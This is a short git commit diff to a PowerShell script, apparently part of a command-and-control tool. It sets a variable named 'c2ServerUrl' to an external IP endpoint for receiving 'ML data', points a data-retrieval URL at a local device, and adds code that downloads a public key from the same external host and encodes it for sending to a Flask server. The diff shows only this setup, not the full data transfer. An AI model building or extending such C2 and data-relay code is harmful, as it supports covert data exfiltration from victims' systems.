b81cea726e170838df69f3bacd7e5d519cb20f30
wyvernk <30991653+wyvernk@users.noreply.github.com>
2024-07-12 23:27:48 +0800

    Updated TestMLData to work with key

--- PowerShell/TestMLData.ps1
+++ PowerShell/TestMLData.ps1
@@ -1,6 +1,19 @@
-$raspberryPiUrl = "http://10.0.0.1:5000/retrieve_data"
-$c2ServerUrl = "https://rapid.tlnas.duckdns.org/receive_ml_data.php"
-$base_url = "http://10.0.0.1:5000"
+$raspberryPiUrl = "http://10.0.0.1/retrieve_data"
+$c2ServerUrl = "http://218.212.190.105/receive_ml_data.php"
+$base_url = "http://10.0.0.1"
+$key = 'http://218.212.190.105/get_public_key.php'
+
+try {
+	$pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
+	Write-Host "Retrieved public key from web server." -ForegroundColor Green
+} catch {
+	Write-Error "Failed to retrieve public key from web server: $_"
+	return
+}
+
+# Send public key to Flask server in JSON format
+$key_data = @{PuK = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pub_key.tostring()))}
+$completed = $false
 
 function Is_Connected {
     $check = $null
